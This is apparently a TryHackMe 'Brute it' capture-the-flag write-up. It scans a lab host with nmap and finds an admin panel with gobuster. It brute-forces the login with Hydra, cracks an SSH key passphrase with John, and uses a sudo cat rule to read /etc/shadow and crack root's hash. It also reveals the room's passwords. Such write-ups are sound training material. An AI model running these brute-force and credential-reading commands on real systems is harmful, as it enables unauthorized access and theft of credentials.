---
title: "Brute it - TryHackMe"
date: 2026-04-14 02:00:00 +0000
categories: [TryHackMe, Writeups]
tags: [nmap, gobuster, john, ssh]
image: /assets/img/writeups/covers/brute-it.jpg
---
# Brute it - TryHackMe
![1.png](/assets/img/writeups/brute-it/1.png)
**Category:** Linux Challenges / CTF<br>**Difficulty:** Easy

> **Warning:** Full solutions ahead. Try the room yourself first!

---

## Overview

This room walks you through a classic CTF attack chain from reconnaissance to root. We'll use Nmap to fingerprint the target, Gobuster to find hidden pages, Hydra to brute-force a login panel, and John the Ripper to crack both an RSA key passphrase and a root password hash.

## Step 1 — Reconnaissance with Nmap

```bash
$ nmap -A 10.112.140.87
```

**Flags explained:**

| Flag | What it does |
|---|---|
| `-A` | Aggressive scan — enables OS detection, script scanning, and traceroute |


**Output:**

```
$ nmap -A 10.114.129.154        
Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-14 15:49 +0500
Nmap scan report for 10.114.129.154 (10.114.129.154)
Host is up (0.15s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA)
|   256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA)
|_  256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.99%E=4%D=4/14%OT=22%CT=1%CU=30847%PV=Y%DS=3%DC=T%G=Y%TM=69DE1BE
OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)SEQ
OS:(SP=104%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=104%GCD=1%ISR=10B%TI=Z%
OS:CI=Z%II=I%TS=A)SEQ(SP=106%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=107%G
OS:CD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M4E8ST11NW7%O2=M4E8ST11NW7%O3=M4
OS:E8NNT11NW7%O4=M4E8ST11NW7%O5=M4E8ST11NW7%O6=M4E8ST11)WIN(W1=F4B3%W2=F4B3
OS:%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M4E8NNSNW7%C
OS:C=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%
OS:T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD
OS:=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S
OS:=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK
OS:=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   152.05 ms 192.168.128.1 (192.168.128.1)
2   ...
3   153.79 ms 10.114.129.154 (10.114.129.154)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.88 seconds
```

From the output we can answer the first three questions in one go:

- **Open ports:** 2 (port 22 and port 80)
- **SSH version:** OpenSSH 7.6p1
- **Apache version:** Apache httpd 2.4.29
- **Linux distribution:** The SSH banner reads `Ubuntu` — OpenSSH 7.6p1 is packaged with Ubuntu 4ubuntu0.3, which confirms the OS.

---

## Step 2 — Finding the Hidden Directory with Gobuster

Now that we know port 80 is running a web server, let's look for hidden directories.

```bash
gobuster dir -u http://10.112.140.87 -w /usr/share/wordlists/dirb/common.txt -t 60
```

**New flags explained:**

| Flag | What it does |
|---|---|
| `dir` | Directory brute-forcing mode |
| `-u` | Target URL |
| `-w` | Wordlist to use for guessing directory names |
| `-t 60` | Use 60 threads for a faster scan |


Gobuster reveals a hidden directory: `/admin`
![1.png](/assets/img/writeups/brute-it/login-page.png)

---

## Step 3 — Cracking the Admin Panel

### Finding the Username

Navigate to:

```
http://10.112.140.87/admin
```

Right-click the page and select **View Page Source**. Inside the HTML you'll find a comment left by the developer that reveals the username:

```
Username: admin
```

![1.png](/assets/img/writeups/brute-it/2.png)

### Brute-Forcing the Password with Hydra

Now that we have the username, we brute-force the password using **Hydra**:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.112.140.87 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:F=Username or password invalid" -V
```

**Flags explained:**

| Flag | What it does |
|---|---|
| `-l admin` | Use `admin` as the fixed username |
| `-P rockyou.txt` | Use this wordlist to try passwords one by one |
| `http-post-form` | Tell Hydra we're attacking an HTTP POST login form |
| `"/admin/index.php:..."` | The format is `path:POST_body:failure_string` |
| `^USER^` / `^PASS^` | Placeholders that Hydra replaces with the username and each password attempt |
| `F=Username or password invalid` | The string Hydra looks for to detect a **failed** login |
| `-V` | Verbose — shows each attempt as it happens |

![1.png](/assets/img/writeups/brute-it/3.png)

**Found credentials:** `admin:xavier`

---

## Step 4 — Logging In and Extracting the RSA Key

Log into the admin panel at `http://10.112.140.87/admin` using `admin:xavier`.<br><br>After logging in you are presented with:
- The **web flag** — submit it on TryHackMe 
- An **RSA private key** — this is used to log in via SSH as the user `john`

<br>Copy the entire RSA key (starting from `-----BEGIN RSA PRIVATE KEY-----`) and save it to a file on your machine:

```bash
nano id_rsa
# Paste the key, then save
```

---

## Step 5 — Cracking the RSA Key Passphrase

The private key is passphrase-protected. We'll use **ssh2john** to convert it into a format John the Ripper can crack, then crack it.

```bash
# Convert the key to a crackable hash
ssh2john id_rsa > hash

# Crack it
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

![1.png](/assets/img/writeups/brute-it/john.png)
**Passphrase found:** `rockinroll`

---

## Step 6 — SSH Login and User Flag

Before using the key, fix its permissions. SSH refuses to use private keys that are readable by others:

```bash
chmod 700 id_rsa
```

**What does `chmod 700` mean?**
Linux file permissions are split into three groups: **owner**, **group**, and **others**. Each gets a number: `4` = read, `2` = write, `1` = execute. `7 = 4+2+1`, so the owner gets full read/write/execute access. The `0`s mean group and others get no permissions at all. This makes the key private to you only, which is what SSH requires.<br><br>Now log in:

```bash
ssh john@10.112.140.87 -i id_rsa
```

Enter the passphrase `rockinroll` when prompted. You're in!<br><br>Grab the user flag:

```bash
cat user.txt
```

Submit it on TryHackMe.

---

## Step 7 — Privilege Escalation to Root

### Check Sudo Permissions

```bash
sudo -l
```

The output shows that the user `john` can run `/bin/cat` with sudo — no password required. That's all we need.

### Read the Root Flag Directly

```bash
sudo cat /root/root.txt
```

Submit the root flag on TryHackMe

### Crack Root's Password

While we're here, let's also read the shadow file which stores password hashes for all users:

```bash
sudo cat /etc/shadow
```

Find the line starting with `root:` and copy the hash. It will look like:

```
$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.
```
![1.png](/assets/img/writeups/brute-it/4.png)
Save it to a file locally:

```bash
nano root_hash
# Paste the hash, then save
```

Crack it with John:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt root_hash
```

**Flag explained:**

| Flag | What it does |
|---|---|
| `--format=sha512crypt` | Tell John the hash type is SHA-512 crypt, which is the standard format Linux uses for `/etc/shadow` |

![1.png](/assets/img/writeups/brute-it/root_hash.png)

You now have root's password and can log in directly as root via SSH or `su`.

---

*Written by monasx0 | TryHackMe — Brute It*
